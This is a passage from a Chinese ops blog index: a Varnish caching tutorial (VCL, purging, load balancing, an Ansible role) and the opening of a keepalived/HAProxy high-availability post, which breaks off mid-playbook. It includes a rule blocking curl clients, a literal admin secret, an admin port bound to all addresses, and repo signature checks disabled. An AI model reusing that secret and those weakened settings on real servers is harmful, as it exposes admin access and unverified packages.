#指定加载VCL配置文件 VARNISH_LISTEN_ADDRESS=192.168.1.5 #服务监听的地址 VARNISH_LISTEN_PORT=6081 #默认监听端口 VARNISH_ADMIN_LISTEN_ADDRESS=127.0.0.1 #管理服务监听的地址 VARNISH_ADMIN_LISTEN_PORT=6082 #管理服务监听的端口 VARNISH_SECRET_FILE=/etc/varnish/secret #连接秘钥 VARNISH_STORAGE=\u0026quot;malloc,256M\u0026quot; #用内存提供保存缓存,大小为256M VARNISH_USER=varnish #用户身份 VARNISH_GROUP=varnish #组身份 DAEMON_OPTS=\u0026quot;-p thread_pool_min=5 -p thread_pool_max=500 -p thread_pool_timeout=300\u0026quot; #指定进程的运行参数 VCL Varnish配置语言（VCL）是一种特定于域的语言，用于描述Varnish Cache的请求处理和文档缓存策略。加载新配置时，由Manager进程创建的VCC进程将VCL代码转换为C.此C代码通常由gcc共享对象编译。然后将共享对象加载到cacher进程中。\n varnish的有限状态机：  VCL有多个状态引擎，状态之间存在相关性，但状态引擎彼此间互相隔离；每个状态引擎可使用return(x)指明关联至哪个下一级引擎；每个状态引擎对应于vcl文件中的一个配置段，即为subroutine\n俩个特殊的引擎：\nvcl_init：在处理任何请求之前要执行的vcl代码：主要用于初始化VMODs； vcl_fini：所有的请求都已经结束，在vcl配置被丢弃时调用；主要用于清理VMODs； vainish默认的VCL配置  默认VCL配置也叫做隐式规则，在配置文件中无法看到，即使我们修改了配置文件，默认配置规则也是在最后做处理。\n varnish\u0026gt; vcl.show -v boot #在客户端cli工具中查看 sub vcl_recv { if (req.method == \u0026quot;PRI\u0026quot;) { #如果客户端的请求方法是PRI，不支持SPDY或HTTP/2.0 return (synth(405)); #则构建一个405的包响应给客户端 } if (req.method != \u0026quot;GET\u0026quot; \u0026amp;\u0026amp; #如果客户端的请求方法不是GET req.method != \u0026quot;HEAD\u0026quot; \u0026amp;\u0026amp; #并且不是HEAD req.method != \u0026quot;PUT\u0026quot; \u0026amp;\u0026amp; #并且不是PUT req.method != \u0026quot;POST\u0026quot; \u0026amp;\u0026amp; #并且不是... req.method != \u0026quot;TRACE\u0026quot; \u0026amp;\u0026amp; req.method != \u0026quot;OPTIONS\u0026quot; \u0026amp;\u0026amp; req.method != \u0026quot;DELETE\u0026quot;) { return (pipe); #即，不是标准HTTP请求方法的交给pipe（管道） } if (req.method != \u0026quot;GET\u0026quot; \u0026amp;\u0026amp; req.method != \u0026quot;HEAD\u0026quot;) { #请求方法不是GET和HEAD的 return (pass); #交给pass处理，也就是除了GAT和HEAD方法其他的无法缓存 } if (req.http.Authorization || req.http.Cookie) { #http的请求首部包含Authorization（认证）或Cookie，即个人专有信息 return (pass); #交给pass处理，因为这些带有个人信息的数据无法缓存 } return (hash); #以上的规则都没有做处理的请求交给hash做处理，剩下的是可以查询缓存的请求了 } sub vcl_pipe sub vcl_pass sub vcl_hash sub vcl_purge sub vcl_hit sub vcl_miss sub vcl_deliver sub vcl_synth sub vcl_backend_fetch sub vcl_backend_response sub vcl_backend_error sub vcl_init sub vcl_fini 内建函数  regsub(str, regex, sub) regsuball(str, regex, sub) ban(boolean expression) hash_data(input) synthetic(str) hash_data()：指明哈希计算的数据；减少差异，以提升命中率 regsub(str,regex,sub)：把str中被regex第一次匹配到字符串替换为sub；主要用于URL Rewrite regsuball(str,regex,sub)：把str中被regex每一次匹配到字符串均替换为sub return() ban(expression) ban_url(regex)：Bans所有的其URL可以被此处的regex匹配到的缓存对象 synth(status,\u0026ldquo;STRING\u0026rdquo;)：生成响应报文  Keywords  call subroutine return(action) new set unset  操作符  ==, !=, ~, \u0026gt;, \u0026gt;=, \u0026lt;, \u0026lt;= 逻辑操作符：\u0026amp;\u0026amp;, ||, ! 变量赋值：=  示例1：obj.hits是内建变量，用于保存某缓存项的从缓存中命中的次数\n# vim /etc/varnish/varnish.params VARNISH_LISTEN_PORT=80 # vim /etc/varnish/default.vcl backend default { .host = \u0026quot;192.168.0.9\u0026quot;; .port = \u0026quot;80\u0026quot;; } sub vcl_deliver { if (obj.hits\u0026gt;0) { set resp.http.X-Cache = \u0026quot;HIT via\u0026quot; + \u0026quot; \u0026quot; + server.ip; } else { set resp.http.X-Cache = \u0026quot;MISS from \u0026quot; + server.ip; } } # systemctl restart varnish #谨慎重启varnish服务，会导致之前的缓存失效 # for i in {1..5}; do curl -I -s 192.168.0.8 |grep \u0026quot;X-Cache\u0026quot;; done #在客户端测试，第一次Miss X-Cache: MISS from 192.168.0.8 X-Cache: HIT via 192.168.0.8 X-Cache: HIT via 192.168.0.8 X-Cache: HIT via 192.168.0.8 X-Cache: HIT via 192.168.0.8 内建变量  req.*：request，表示由客户端发来的请求报文相关； bereq.*：由varnish发往BE主机的httpd请求相关； beresp.*：由BE主机响应给varnish的响应报文相关； resp.*：由varnish响应给client相关； obj.*：存储在缓存空间中的缓存对象的属性；只读；  常用变量：\n bereq.request, req.request：请求方法； bereq.url, req.url：请求的url； bereq.proto：请求的协议版本； bereq.backend：指明要调用的后端主机； req.http.Cookie：客户端的请求报文中Cookie首部的值； req.http.User-Agent ~ \u0026ldquo;chrome\u0026rdquo;； beresp.status, resp.status：响应的状态码； reresp.proto, resp.proto：协议版本； beresp.backend.name：BE主机的主机名； beresp.ttl：BE主机响应的内容的余下的可缓存时长； obj.hits：此对象从缓存中命中的次数； obj.ttl：对象的ttl值 server.ip：varnish主机的IP； server.hostname：varnish主机的Hostname； client.ip：发请求至varnish主机的客户端IP；  示例2：强制对某类资源的请求不检查缓存\n# vim /etc/varnish/default.vcl sub vcl_recv { if (req.url ~ \u0026quot;(?i)^/(login|admin)\u0026quot;) { #\u0026quot;?i\u0026quot;表示忽略大小写，匹配到url中带有login或admin的不查询缓存 return(pass); } } # varnish_reload_vcl # for i in {1..5}; do curl -I -s http://192.168.0.8/login |grep \u0026quot;X-Cache\u0026quot;; done #客户端测试 X-Cache: MISS from 192.168.0.8 #全部Miss X-Cache: MISS from 192.168.0.8 X-Cache: MISS from 192.168.0.8 X-Cache: MISS from 192.168.0.8 X-Cache: MISS from 192.168.0.8 # for i in {1..5}; do curl -I -s http://192.168.0.8/admin |grep \u0026quot;X-Cache\u0026quot;; done X-Cache: MISS from 192.168.0.8 X-Cache: MISS from 192.168.0.8 X-Cache: MISS from 192.168.0.8 X-Cache: MISS from 192.168.0.8 X-Cache: MISS from 192.168.0.8 # for i in {1..5}; do curl -I -s http://192.168.0.8/ |grep \u0026quot;X-Cache\u0026quot;; done #其他网页正常查询缓存 X-Cache: MISS from 192.168.0.8 X-Cache: HIT via 192.168.0.8 X-Cache: HIT via 192.168.0.8 X-Cache: HIT via 192.168.0.8 X-Cache: HIT via 192.168.0.8 示例3：对于特定类型的资源，例如公开的图片等，取消其私有标识，并强行设定其可以由varnish缓存的时长\nsub vcl_backend_response { if (beresp.http.cache-control !~ \u0026quot;s-maxage\u0026quot;) { if (bereq.url ~ \u0026quot;(?i)\\.(jpg|jpeg|png|gif|css|js)$\u0026quot;) { unset beresp.http.Set-Cookie; set beresp.ttl = 3600s; } } } 示例4：在报文首部添加真正的客户端IP，使得后端server可以记录真正客户端来源\n[root@varnish ~]# vim /etc/varnish/default.vcl sub vcl_recv { if (req.restarts == 0) { #匹配没有被重写的URL请求，即第一次请求 if (req.http.X-Forwarded-For) { #变量存在并且有值则为真 set req.http.X-Forwarded-For = req.http.X-Forwarded-For + \u0026quot;,\u0026quot; + client.ip; #将真正的client.ip添加到此变量中，用\u0026quot;,\u0026quot;隔开 } else { set req.http.X-Forwarded-For = client.ip; #如果变量不存在或值为空，则直接将client.ip赋值与 } } } [root@varnish ~]# varnishadm -S /etc/varnish/secret -T 127.0.0.1:6082 varnish\u0026gt; vcl.load conf1 /etc/varnish/default.vcl varnish\u0026gt; vcl.use conf1 varnish\u0026gt; vcl.list available 0 boot available 0 reload_2018-07-14T09:55:58 active 0 conf1 #当前正在使用的配置 [root@web1 ~]# vim /etc/httpd/conf/httpd.conf LogFormat \u0026quot;%{X-Forwarded-For}i %l %u %t \\\u0026quot;%r\\\u0026quot; %\u0026gt;s %b \\\u0026quot;%{Referer}i\\\u0026quot; \\\u0026quot;%{User-Agent}i\\\u0026quot;\u0026quot; combined [root@web1 ~]# systemctl restart httpd [root@client ~]# for i in {1..5}; do curl -I -s http://192.168.0.8/login |grep \u0026quot;X-Cache\u0026quot;; done #在客户端测试 [root@web1 ~]# tail /var/log/httpd/access_log 192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] \u0026quot;HEAD /login HTTP/1.1\u0026quot; 301 - \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; 192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] \u0026quot;HEAD /login HTTP/1.1\u0026quot; 301 - \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; 192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] \u0026quot;HEAD /login HTTP/1.1\u0026quot; 301 - \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; 192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] \u0026quot;HEAD /login HTTP/1.1\u0026quot; 301 - \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; 192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] \u0026quot;HEAD /login HTTP/1.1\u0026quot; 301 - \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; 192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] \u0026quot;HEAD /login HTTP/1.1\u0026quot; 301 - \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; 192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] \u0026quot;HEAD /login HTTP/1.1\u0026quot; 301 - \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; 192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] \u0026quot;HEAD /login HTTP/1.1\u0026quot; 301 - \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; 192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] \u0026quot;HEAD /login HTTP/1.1\u0026quot; 301 - \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; 192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] \u0026quot;HEAD /login HTTP/1.1\u0026quot; 301 - \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; #拿到了真正客户端IP，而不是之前的varnish服务器的IP 示例5：访问控制，拒绝curl客户端的访问\nsub vcl_recv { if(req.http.User-Agent ~ \u0026quot;curl\u0026quot;) { return(synth(403)); } } 缓存对象的修剪：purge  能执行purge操作  sub vcl_purge { return (synth(200,\u0026quot;Purged\u0026quot;)); } 何时执行purge操作  sub vcl_recv { if (req.method == \u0026quot;PURGE\u0026quot;) { return(purge); } ... } 示例6：清除指定缓存\n[root@varnish ~]# vim /etc/varnish/default.vcl acl purgers { \u0026quot;127.0.0.0\u0026quot;/8; \u0026quot;192.168.0.0\u0026quot;/24; } sub vcl_recv { if (req.method == \u0026quot;PURGE\u0026quot;) { if (!client.ip ~ purgers) { return(synth(405,\u0026quot;Purging not allowed for \u0026quot; + client.ip)); } return(purge); } } varnish\u0026gt; vcl.load conf3 /etc/varnish/default.vcl varnish\u0026gt; vcl.use conf3 [root@client ~]# curl -I http://192.168.0.8/ X-Cache: HIT via 192.168.0.8 [root@client ~]# curl -I -X \u0026quot;PURGE\u0026quot; http://192.168.0.8/ [root@client ~]# curl -I http://192.168.0.8/ X-Cache: MISS from 192.168.0.8 缓存对象的修剪：Banning 1）varnishadm： ban \u0026lt;field\u0026gt; \u0026lt;operator\u0026gt; \u0026lt;arg\u0026gt;\nvarnish\u0026gt; ban req.url ~ (?i)^/javascripts 2）在配置文件中定义，使用ban()函数\nsub vcl_recv { if (req.method == \u0026quot;BAN\u0026quot;) { ban(\u0026quot;req.http.host == \u0026quot; + req.http.host + \u0026quot; \u0026amp;\u0026amp; req.url == \u0026quot; + req.url); #将规则拼接起来传递给ban函数 return(synth(200, \u0026quot;Ban added\u0026quot;)); } } # curl -I -X \u0026quot;BAN\u0026quot; http://192.168.0.8/javascripts/ 多个后端主机实现调度功能 动静分离示例： backend default { .host = \u0026quot;172.16.0.9\u0026quot;; .port = \u0026quot;80\u0026quot;; } backend appsrv { .host = \u0026quot;172.16.0.10\u0026quot;; .port = \u0026quot;80\u0026quot;; } sub vcl_recv { if (req.url ~ \u0026quot;(?i)\\.php$\u0026quot;) { set req.backend_hint = appsrv; } else { set req.backend_hint = default; } } 轮询调度 import directors; backend srv1 { .host = \u0026quot;192.168.0.9\u0026quot;; .port = \u0026quot;80\u0026quot;; } backend srv2 { .host = \u0026quot;192.168.0.10\u0026quot;; .port = \u0026quot;80\u0026quot;; } sub vcl_init { new websrvs = directors.round_robin(); #round_robin()调度算法，不支持加权 websrvs.add_backend(srv1); websrvs.add_backend(srv2); } sub vcl_recv { set req.backend_hint = websrvs.backend(); } 基于cookie的session sticky sub vcl_init { new h = directors.hash(); h.add_backend(one, 1); h.add_backend(two, 1); } sub vcl_recv { set req.backend_hint = h.backend(req.http.cookie); } 随机调度，支持权重 sub vcl_init { new websrvs = directors.random(); websrvs.add_backend(srv1, 1); websrvs.add_backend(srv2, 2); } 后端健康检查  .probe：定义健康状态检测方法； .url：检测时要请求的URL，默认为”/\u0026quot;; .request：发出的具体请求； .request = \u0026ldquo;GET /.healthtest.html HTTP/1.1\u0026rdquo; \u0026ldquo;Host: www.fenghong.tech\u0026rdquo; \u0026ldquo;Connection: close\u0026rdquo; .window：基于最近的多少次检查来判断其健康状态； .threshold：最近.window中定义的这么次检查中至有.threshhold定义的次数是成功的； .interval：检测频度； .timeout：超时时长； .expected_response：期望的响应码，默认为200；\n import directors; probe http_chk { .url = \u0026quot;/index.html\u0026quot;; .interval = 2s; .timeout = 2s; .window = 10; #最近10次检查 .threshold = 7; #有7次成功则为健康主机 } backend srv1 { .host = \u0026quot;192.168.0.9\u0026quot;; .port = \u0026quot;80\u0026quot;; .probe = http_chk; } backend srv2 { .host = \u0026quot;192.168.0.10\u0026quot;; .port = \u0026quot;80\u0026quot;; .probe = http_chk; } sub vcl_init { new websrvs = directors.random(); websrvs.add_backend(srv1, 1); websrvs.add_backend(srv2, 2); } sub vcl_recv { set req.backend_hint = websrvs.backend(); } varnish\u0026gt; backend.list #查看后端主机健康状态信息 Backend name Refs Admin Probe srv1(192.168.0.9,,80) 3 probe Healthy 10/10 srv2(192.168.0.10,,80) 3 probe Healthy 10/10 varnish\u0026gt; backend.set_health srv1 sick|healthy|auto #手动标记主机状态 down|up|probe 设置后端的主机属性：\nbackend BE_NAME { ... .connect_timeout = 0.5s; #连接超时时间 .first_byte_timeout = 20s; #第一个字节20s不响应则为超时 .between_bytes_timeout = 5s; #第一个字节和第二个字节间隔超时时间 .max_connections = 50; #最大连接数 } varnish的运行时参数  最大并发连接数 = thread_pools * thread_pool_max\n  thread_pools：工作线程数，最好小于或等于CPU核心数量 thread_pool_max：每线程池的最大线程数 thread_pool_min：最大空闲线程数 thread_pool_timeout：空闲超过多长时间被清除 thread_pool_add_delay：生成线程之前等待的时间 thread_pool_destroy_delay：清除超出最大空闲线程数的线程之前等待的时间  日志管理 virnish的日志默认存储在80M的内存空间中，如果日志记录超出了则覆盖前边的日志，服务器重启后丢失；需要更改配置使其永久保存到磁盘\n# varnishstat -1 -f MAIN #指定查看MAIN段的信息 # varnishstat -1 -f MAIN.cache_hit -f MAIN.cache_miss #显示指定参数的当前统计数据 MAIN.cache_hit 47 0.00 Cache hits MAIN.cache_miss 89 0.01 Cache misses # varnishtop -1 -i ReqHeader #显示指定的排序信息 165.00 ReqHeader Accept: */* 165.00 ReqHeader Host: 192.168.0.8 165.00 ReqHeader User-Agent: curl/7.29.0 165.00 ReqHeader X-Forwarded-For: 192.168.0.7 将日志永久保存到：/var/log/varnish/varnish.log\n# systemctl start varnishlog.service 以Apache/NCSA日志格式显示\n# varnishncsa 192.168.0.7 - - [14/Jul/2018:12:34:23 +0800] \u0026quot;GET http://192.168.0.8/javascripts/test1.html HTTP/1.1\u0026quot; 200 11 \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; ansible-role-varnish # tree ansible-role-varnish/ ansible-role-varnish/ ├── files │ ├── default.vcl │ ├── secret │ └── varnish.params ├── handlers │ └── main.yml ├── tasks │ ├── copy.yml │ ├── main.yml │ ├── setup-varnish.yml │ └── start.yml └── templates # find ansible-role-varnish/ -name *.yml -exec ls {} \\; -exec cat {} \\; ansible-role-varnish/handlers/main.yml - name: restart varnish service: name=varnish state=restarted - name: reload vcl command: varnish_reload_vcl ansible-role-varnish/tasks/start.yml - name: start service service: name=varnish state=started ansible-role-varnish/tasks/copy.yml - name: copy configure file copy: src=varnish.params dest=/etc/varnish/varnish.params notify: restart varnish - name: copy secret file copy: src=secret dest=/etc/varnish/secret notify: restart varnish - name: copy default.vcl file copy: src=default.vcl dest=/etc/varnish/default.vcl notify: reload vcl ansible-role-varnish/tasks/main.yml - include: setup-varnish.yml - include: copy.yml - include: start.yml ansible-role-varnish/tasks/setup-varnish.yml - name: install yum-utils yum: name={{ item }} state=present with_items: - yum-utils - pygpgme - name: Add epel repo yum_repository: name: alibaba description: epel baseurl: https://mirrors.aliyun.com/epel/7Server/x86_64/ repo_gpgcheck: no gpgcheck: no enabled: yes - name: install varnish yum: name=varnish state=present # find ansible-role-varnish/files/* -exec ls {} \\; -exec cat {} \\; ansible-role-varnish/files/default.vcl #------------------------------------------------- vcl 4.0; import directors; backend default { .host = \u0026quot;127.0.0.1\u0026quot;; .port = \u0026quot;8080\u0026quot;; } probe http_chk { .url = \u0026quot;/index.html\u0026quot;; .interval = 2s; .timeout = 2s; .window = 10; .threshold = 7; } backend srv1 { .host = \u0026quot;192.168.0.9\u0026quot;; .port = \u0026quot;80\u0026quot;; .probe = http_chk; } backend srv2 { .host = \u0026quot;192.168.0.10\u0026quot;; .port = \u0026quot;80\u0026quot;; .probe = http_chk; } sub vcl_init { new websrvs = directors.random(); websrvs.add_backend(srv1, 1); websrvs.add_backend(srv2, 1); } sub vcl_recv { set req.backend_hint = websrvs.backend(); if (req.restarts == 0) { if (req.http.X-Forwarded-For) { set req.http.X-Forwarded-For = req.http.X-Forwarded-For + \u0026quot;,\u0026quot; + client.ip; } else { set req.http.X-Forwarded-For = client.ip; } } if(req.http.User-Agent ~ \u0026quot;curl\u0026quot;) { return(synth(403)); } } sub vcl_backend_response { if (beresp.http.cache-control !~ \u0026quot;s-maxage\u0026quot;) { if (bereq.url ~ \u0026quot;(?i)\\.(jpg|jpeg|png|gif|css|js)$\u0026quot;) { unset beresp.http.Set-Cookie; set beresp.ttl = 3600s; } } } sub vcl_deliver { if (obj.hits\u0026gt;0) { set resp.http.X-Cache = \u0026quot;HIT via\u0026quot; + \u0026quot; \u0026quot; + server.ip; } else { set resp.http.X-Cache = \u0026quot;MISS from \u0026quot; + server.ip; } } #------------------------------------------------- ansible-role-varnish/files/secret 7e40f334-d2e7-4edb-aecb-559519e456f9 ansible-role-varnish/files/varnish.params RELOAD_VCL=1 VARNISH_VCL_CONF=/etc/varnish/default.vcl VARNISH_LISTEN_ADDRESS=0.0.0.0 VARNISH_LISTEN_PORT=80 VARNISH_ADMIN_LISTEN_ADDRESS=0.0.0.0 VARNISH_ADMIN_LISTEN_PORT=6082 VARNISH_SECRET_FILE=/etc/varnish/secret VARNISH_STORAGE=\u0026quot;malloc,256M\u0026quot; VARNISH_USER=varnish VARNISH_GROUP=varnish #DAEMON_OPTS=\u0026quot;-p thread_pool_min=5 -p thread_pool_max=500 -p thread_pool_timeout=300\u0026quot; 感谢阅读！\n","permalink":"https://www.fenghong.tech/blog/2018/2018-07-15-varnish/","tags":["Linux","internet","server","cache"],"title":"Varnish"},{"categories":["ops"],"contents":"摘要：\n HA cluster的概念 Keepalive的应用及配置 keepalived+haporxy实验 ansible+keepalived+nginx实验  HA cluster ​\tHA是High Available缩写，是双机集群系统简称，指高可用性集群，是保证业务连续性的有效解决方案，一般有两个或两个以上的节点，且分为活动节点及备用节点。\n LB：负载均衡集群   lvs负载均衡 nginx反向代理 HAProxy\n  HA：高可用集群   eartbeat eepalived edhat5 : cman + rgmanager , conga(WebGUI) –\u0026gt; RHCS（Cluster Suite）集群套件 edhat6 : cman + rgmanager , corosync + pacemaker edhat7 : corosync + pacemaker\n  HP：高性能集群   \u0026gt; total/2 with quorum \u0026lt;= total/2 without quorum  heartbeat:  heartbeat: heratbeat cluster-glye pacemaker corosync + pacemaker (100个节点集群) STONITH: shooting the other node in the head cman + rgmanager keepalive  keepalived的相关概念  vrrp协议：Virtual Redundant Routing Protocol 虚拟冗余路由协议 Virtual Router：虚拟路由器 VRID(0-255)：虚拟路由器标识 master：主设备，当前工作的设备 backup：备用设备 priority：优先级，优先级越大优先工作，具体情况示工作方式决定 VIP：虚拟IP地址，正真向客户服务的IP地址 VMAC：虚拟MAC地址(00-00-5e-00-01-VRID) 抢占式：如果有优先级高的节点上线，则将此节点转为master 非抢占式：即使有优先级高的节点上线，在当前master工作无故障的情况运行抢占；等到此master故障后重新按优先级选举master 心跳：master将自己的心跳信息通知集群内的所有主机，证明自己正常工作 安全认证机制： 无认证：任何主机都可成为集群内主机，强烈不推荐 简单的字符认证：使用简单的密码进行认证 AH认证 sync group：同步组，VIP和DIP配置到同一物理服务器上 MULTICAST：组播，多播 Failover：master故障，故障切换，故障转移 Failback：故障节点重新上线，故障切回  keepalived的模型结构如下：  安装 $ yum install -y keepalived $ rpm -ql keepalived /etc/keepalived /etc/keepalived/keepalived.conf #主配置文件 /etc/sysconfig/keepalived\t#uint files配置文件\t/usr/bin/genhash /usr/lib/systemd/system/keepalived.service\t#uint files /usr/libexec/keepalived /usr/sbin/keepalived\t#主程序文件 配置 需开启multicast，基于多播模式。\n$ ip link set dev ens33 multicast on #基于多播模式  全局配置段  global_defs { notification_email { #发送通知email，收件人 acassen@firewall.loc failover@firewall.loc sysadmin@firewall.loc } notification_email_from Alexandre.Cassen@firewall.loc smtp_server 192.168.200.1 #邮件服务器地址 smtp_connect_timeout 30 #超时时长 router_id LVS_DEVEL #路由器标识ID vrrp_skip_check_adv_addr #跳过的检查地址 vrrp_strict #严格模式 vrrp_garp_interval 0 #免费arp vrrp_gna_interval 0 }  虚拟路由示例段  vrrp_instance \u0026lt;STRING\u0026gt; { state MASTER|BACKUP：#当前节点在此虚拟路由器上的初始状态；只能有一个是MASTER，余下的都应该为BACKUP； interface IFACE_NAME：#绑定为当前虚拟路由器使用的物理接口； virtual_router_id VRID：#当前虚拟路由器的惟一标识，范围是0-255； priority 100：#当前主机在此虚拟路径器中的优先级；范围1-254； advert_int 1：#vrrp通告的时间间隔； authentication { auth_type AH|PASS #pass为简单认证 auth_pass \u0026lt;PASSWORD\u0026gt; #认证密码，8为密码 } virtual_ipaddress { #VIP配置 \u0026lt;IPADDR\u0026gt;/\u0026lt;MASK\u0026gt; brd \u0026lt;IPADDR\u0026gt; dev \u0026lt;STRING\u0026gt; scope \u0026lt;SCOPE\u0026gt; label \u0026lt;LABEL\u0026gt; 192.168.200.17/24 dev eth1 192.168.200.18/24 dev eth2 label eth2:1 } track_interface { #配置要监控的网络接口，一旦接口出现故障，则转为FAULT状态； eth0 eth1 ... } nopreempt：定义工作模式为非抢占模式； preempt_delay 300：抢占式模式下，节点上线后触发新选举操作的延迟时长； notify_master \u0026lt;STRING\u0026gt;|\u0026lt;QUOTED-STRING\u0026gt;：当前节点成为主节点时触发的脚本； notify_backup \u0026lt;STRING\u0026gt;|\u0026lt;QUOTED-STRING\u0026gt;：当前节点转为备节点时触发的脚本； notify_fault \u0026lt;STRING\u0026gt;|\u0026lt;QUOTED-STRING\u0026gt;：当前节点转为“失败”状态时触发的脚本； notify \u0026lt;STRING\u0026gt;|\u0026lt;QUOTED-STRING\u0026gt;：通用格式的通知触发机制，一个脚本可完成以上三种状态的转换时的通知； }  虚拟服务器配置   delay_loop \u0026lt;INT\u0026gt;：服务轮询的时间间隔； lb_algo rr|wrr|lc|wlc|lblc|sh|dh：定义调度方法； lb_kind NAT|DR|TUN：集群的类型； persistence_timeout \u0026lt;INT\u0026gt;：持久连接时长； protocol TCP：服务协议，仅支持TCP； sorry_server \u0026lt;IPADDR\u0026gt; \u0026lt;PORT\u0026gt;：备用服务器地址； real_server \u0026lt;IPADDR\u0026gt; \u0026lt;PORT\u0026gt; { weight \u0026lt;INT\u0026gt; notify_up \u0026lt;STRING\u0026gt;|\u0026lt;QUOTED-STRING\u0026gt; notify_down \u0026lt;STRING\u0026gt;|\u0026lt;QUOTED-STRING\u0026gt; HTTP_GET|SSL_GET|TCP_CHECK|SMTP_CHECK|MISC_CHECK { ... }：定义当前主机的健康状态检测方法； } HTTP_GET|SSL_GET：应用层检测 HTTP_GET|SSL_GET { url { path \u0026lt;URL_PATH\u0026gt;：定义要监控的URL； status_code \u0026lt;INT\u0026gt;：判断上述检测机制为健康状态的响应码； digest \u0026lt;STRING\u0026gt;：判断上述检测机制为健康状态的响应的内容的校验码； } nb_get_retry \u0026lt;INT\u0026gt;：重试次数； delay_before_retry \u0026lt;INT\u0026gt;：重试之前的延迟时长； connect_ip \u0026lt;IP ADDRESS\u0026gt;：向当前RS的哪个IP地址发起健康状态检测请求 connect_port \u0026lt;PORT\u0026gt;：向当前RS的哪个PORT发起健康状态检测请求 bindto \u0026lt;IP ADDRESS\u0026gt;：发出健康状态检测请求时使用的源地址； bind_port \u0026lt;PORT\u0026gt;：发出健康状态检测请求时使用的源端口； connect_timeout \u0026lt;INTEGER\u0026gt;：连接请求的超时时长； } TCP_CHECK { connect_ip \u0026lt;IP ADDRESS\u0026gt;：向当前RS的哪个IP地址发起健康状态检测请求 connect_port \u0026lt;PORT\u0026gt;：向当前RS的哪个PORT发起健康状态检测请求 bindto \u0026lt;IP ADDRESS\u0026gt;：发出健康状态检测请求时使用的源地址； bind_port \u0026lt;PORT\u0026gt;：发出健康状态检测请求时使用的源端口； connect_timeout \u0026lt;INTEGER\u0026gt;：连接请求的超时时长； }  脚本  vrrp_script \u0026lt;SCRIPT_NAME\u0026gt; { script \u0026quot;\u0026quot; #定义执行脚本 interval INT #多长时间检测一次 weight -INT #如果脚本的返回值为假，则执行权重减N的操作 rise 2 #检测2次为真，则上线 fall 3 #检测3次为假，则下线 } vrrp_instance VI_1 { track_script { #在虚拟路由实例中调用此脚本 SCRIPT_NAME_1 SCRIPT_NAME_2 ... } }  ipvs+keepalive的配置  virtual_server IP port| virtual_server fwmark int { ··· real_server{ ··· } } keepalived+HAproxy 环境：\n192.168.0.10:80 192.168.0.11:80 192.168.0.12:80 三台web服务器已经搭好 $ yum install -y httpd $ echo `hostname` \u0026gt; /var/www/html/index.html $ systemctl start httpd  配置HAProxy，两台主机一样的配置  $ vim /etc/haproxy/haproxy.cfg frontend web *:80 default_backend websrvs backend websrvs balance roundrobin server srv1 192.168.0.10:80 check server srv2 192.168.0.11:80 check server srv3 192.168.0.12:80 check  配置keepalived实现高可用，一台为MASTER一台为BACKUP.  $ vim /etc/keepalived/keepalived.conf ! Configuration File for keepalived global_defs { notification_email { root@localhost } notification_email_from keepalived@localhoat smtp_server 127.0.0.1 smtp_connect_timeout 30 router_id node1 vrrp_skip_check_adv_addr vrrp_strict vrrp_garp_interval 0 vrrp_gna_interval 0 vrrp_mcast_group4 224.0.111.111 vrrp_iptables } vrrp_script chk_haproxy { script \u0026quot;killall -0 haproxy\u0026quot; #监控haproxy进程 interval 1 weight -5 fall 2 rise 1 } vrrp_script chk_down { script \u0026quot;/bin/bash -c '[[ -f /etc/keepalived/down ]]' \u0026amp;\u0026amp; exit 1 || exit 0\u0026quot; #在keepalived中要特别地指明作为bash的参数的运行 interval 1 weight -10 } vrrp_instance VI_1 { state MASTER\t#一台为BACKUP interface eth0 virtual_router_id 51 priority 100\t#当为BACKUP时，priority适当减少，建议95。 advert_int 1 authentication { auth_type PASS auth_pass fd57721a } virtual_ipaddress { 192.168.0.2/24 dev eth0 } track_script { #调用监控脚本 chk_haproxy chk_down } notify_master \u0026quot;/etc/keepalived/notify.sh master\u0026quot; notify_backup \u0026quot;/etc/keepalived/notify.sh backup\u0026quot; notify_fault \u0026quot;/etc/keepalived/notify.sh fault\u0026quot; } 测试：创建down文件后使得降优先级，从而使得VIP漂移到node2，进入维护模式 $ touch /etc/keepalived/down ansible实现双主keepalived+nginx反代 拓扑图：\n环境：\n 各节点时间必须同步； 确保iptables及selinux的正确配置； 各节点之间可通过主机名互相通信（对KA并非必须），建议使用/etc/hosts文件实现； 确保各节点的用于集群服务的接口支持MULTICAST通信；D类：224-239；ip link set dev eth0 multicast off | on  配置过程  主机配置及同步时间  $ ssh-keygen -t rsa $ ssh-copy-id -i .ssh/id_rsa.pub root@192.168.1.28 $ ssh-copy-id -i .ssh/id_rsa.pub root@192.168.1.30 $ vim /etc/ansible/hosts [nginx] 192.168.1.30 state1=MASTER priority1=100 state2=BACKUP priority2=90\t#两套变量 192.168.1.28 state1=BACKUP priority1=90 state2=MASTER priority2=100 ansbile all -s 'ntpdate 210.72.145.44 ' //是中国国家授时中心的官方服务器。  配置palybook的tasks任务  vim /etc/ansible/roles/nginx/tasks/main.yml - name: install package yum: name={{ item }} with_items: - nginx - keepalived - name: config keepalived template: src=keepalived.conf.j2 dest=/etc/keepalived/keepalived.conf notify: restart keepalived - name: file notify.sh copy: src=notify.sh dest=/etc/keepalived/ - name: config nginx template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf notify: restart nginx - name: start service service: name={{ item }} state=started enabled=true with_items: - keepalived - nginx  添加handlers  vim /etc/ansible/roles/nginx/handlers/main.yml - name: restart keepalived 